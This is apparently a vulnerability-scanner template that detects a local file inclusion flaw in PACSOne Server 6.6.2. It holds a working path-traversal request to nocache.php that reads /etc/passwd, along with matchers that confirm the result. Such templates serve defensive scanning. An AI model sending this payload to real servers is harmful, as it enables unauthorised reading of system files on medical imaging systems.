id: pacsone-server-lfi
name: PACSOne Server 6.6.2 - Local File Inclusion
severity: high
confidence: tentative
description: PACSOne Server 6.6.2 is vulnerable to local file inclusion via its integrated DICOM Web Viewer.
reference: CWE-22
tags:
- pacsone
- lfi
- vuln
requests:
- method: GET
  path: /pacsone/nocache.php?path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2f.%2fzpx%2f..%2fpasswd
  matchers:
  - type: regex
    regex:
    - root:[x*]:0:0
  - type: status
    status:
    - 200
  condition: and
